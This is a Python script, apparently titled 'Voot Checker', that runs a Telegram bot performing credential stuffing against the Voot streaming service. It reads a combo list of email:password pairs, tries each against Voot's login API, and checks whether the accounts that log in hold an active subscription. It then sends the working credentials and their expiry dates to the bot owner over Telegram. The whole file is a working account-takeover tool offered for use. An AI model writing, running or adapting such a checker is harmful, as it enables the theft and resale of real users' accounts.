#Name: Voot Checker
#Author: Mayvid

try:
    import pyfiglet
    import requests
    import json                                         
    from telethon.sync import TelegramClient
    from telethon import TelegramClient,events
    from telethon.sync import TelegramClient

except:
    import os
    os.system('pip install requests')
    os.system('pip install telethon')
    os.system('pip install pyfiglet')
    import pyfiglet
    import requests
    import json                                         
    from telethon.sync import TelegramClient
    from telethon import TelegramClient,events
    from telethon.sync import TelegramClient


try:
    imp_data = list()
    tyer = open('session.txt', 'r')
    for i in range(0,4):
        imp_data.append(str(tyer.readline()))
    tyer.close()
    api_id = str(imp_data[0])[:-2]
    api_hash = str(imp_data[1])[:-2]
    bot_token = str(imp_data[2])[:-2]
    owner = int(imp_data[3])

except:
    api_id = input('Enter Api Id: ')
    api_hash = input('Enter Api Hash: ')
    bot_token = input('Enter Bot Token: ')
    owner = int(input('Enter User Id: '))
    tyer = open('session.txt', 'w')
    tyer.write(api_id + '\n' + api_hash + '\n' + bot_token + '\n' + str(owner))
    tyer.close()

print(pyfiglet.figlet_format("R X S"))
print('\nVoot checker bot by Mayvid.')


client = TelegramClient('bot', api_id, api_hash).start(bot_token=bot_token)
@client.on(events.NewMessage)
async def my_event_handler(event):
    if event.peer_id.user_id == owner and event.raw_text == '/check':
        await event.download_media("./"+'database.txt')
        data_holder = dict()
        def reset():
            writer = open('hits.txt', 'w')
            writer.write('')
            writer.close()
            writer = open('failure.txt', 'w')
            writer.write('')
            writer.close()
            writer = open('checked.txt', 'w')
            writer.write('')
            writer.close()

        def database(): # getting email and password from combo file
            opener = open('database.txt')
            while True:
                reader = opener.readline()
                if reader == "":
                    opener.close()
                    break                                      
                email = reader[0:reader.find(':')]
                password = reader[reader.find(':')+1:]
                data_holder[email] = password

        def hits(hit): # saving the hits.
            writer = open('voot_hits.txt', 'a')
            writer.write(hit)
            writer.close()

        def failure(fail): # saving the failures
            writer = open('voot_failures.txt', 'a')
            writer.write(fail)
            writer.close()

        database()

        count = 0
        while count<len(data_holder):
            url = 'https://userauth.voot.com/usersV3/v3/login'
            header = {
                'authority': 'userauth.voot.com',
                'method': 'POST',
                'path': '/usersV3/v3/login',
                'scheme': 'https',
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'en-US,en;q=0.9',
                'content-length': '130',
                'content-type': 'application/json;charset=UTF-8',
                'origin': 'https://www.voot.com',
                'referer': 'https://www.voot.com/',
                'sec-ch-ua': '" Not;A Brand";v="99", "Microsoft Edge";v="91", "Chromium";v="91"',
                'sec-ch-ua-mobile': '?0',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 Edg/91.0.864.71',
                }
            post_data = {'data': {'email': str(list(data_holder.keys())[count]), 'password': str(list(data_holder.values())[count])}, 'type': "traditional", 'deviceId': "Windows NT 6.3", 'deviceBrand': "PC/MAC"}
            posts = requests.post(url=url, headers=header, json=post_data)
            checkers = json.loads(posts.text)
            checkers = dict(checkers)

            try:
                if checkers['status']['message']:
                    failure(str(list(data_holder.keys())[count]) + ':' + str(list(data_holder.values())[count]) + '\nResponse --> '+ 'Wrong combination of user and password.')
            except:
                print(checkers)
                access = checkers['data']['authToken']['accessToken']
                url = 'https://pxapi.voot.com/smsv4/int/ps/v1/voot/user/entitlement/status'
                header = {
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'accesstoken': str(access),
                    'Origin': 'https://www.voot.com',
                    'Referer': 'https://www.voot.com/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 Edg/91.0.864.71',
                }                
                posts = requests.get(url=url, headers=header)
                jsoner = json.loads(posts.text)
                jsoner = dict(jsoner)
                print(jsoner)
                if jsoner['status'] == 'active':
                    expiry = jsoner['activeTillDate']['gmtDate']
                    expiry = expiry[0:expiry.find('2021')+4]
                    hits(str(list(data_holder.keys())[count]) + ':' + str(list(data_holder.values())[count] + 'Expiry date --> ' + str(expiry))+'\n')
                else:
                    failure(str(list(data_holder.keys())[count]) + ':' + str(list(data_holder.values())[count]) + '\nResponse --> '+ checkers['status']['message']+'/n')
            count = count+1

        await client.send_file(event.peer_id.user_id, 'voot_hits.txt', caption='Checker by @mayvidxd. \nVoot Checker.')
        await client.send_file(event.peer_id.user_id, 'voot_failures.txt', caption='Checker by @mayvidxd. \nVoot Checker.')
        
client.run_until_disconnected()
